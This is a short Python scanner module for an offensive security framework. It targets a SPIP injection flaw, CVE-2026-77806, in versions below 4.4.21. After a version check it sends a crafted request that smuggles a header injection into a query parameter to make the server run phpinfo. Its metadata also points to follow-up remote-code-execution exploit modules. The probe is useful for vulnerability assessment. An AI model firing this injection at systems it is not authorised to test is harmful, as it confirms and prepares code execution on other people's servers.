#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SPIP X-Spip-Filtre injection surface (CVE-2026-77806)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.spip import Spip


class Module(Scanner, Http_client, Spip):
    __info__ = {
        "name": "SPIP CVE-2026-77806 detect",
        "description": "Passive version check and phpinfo X-Spip-Filtre probe for SPIP < 4.4.21.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-77806"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-77806"],
        "tags": ["spip", "scanner", "cve-2026-77806"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "exploits/multi/http/spip_cve_2026_77806_x_spip_filtre_rce",
                    "exploits/multi/http/spip_forum_autosave_rce",
                ],
            },
        },
    }

    def run(self):
        ver = self.spip_version()
        if not ver:
            return False
        if self.spip_version_tuple(ver) >= (4, 4, 21):
            return False
        inj = '\nheader("X-Spip-Filtre: intval|phpinfo");\n'
        from urllib.parse import quote

        r = self.http_request(
            method="GET",
            path=f"{self._join('/spip.php')}?k={quote(inj, safe='')}",
        )
        body = (r.text or "") if r else ""
        hits = sum(1 for m in ("PHP Version", "PHP Extension") if m in body)
        if hits >= 1:
            self.set_info(severity="critical", cve="CVE-2026-77806", version=ver)
            return True
        self.set_info(severity="high", reason=f"SPIP {ver} < 4.4.21", version=ver)
        return True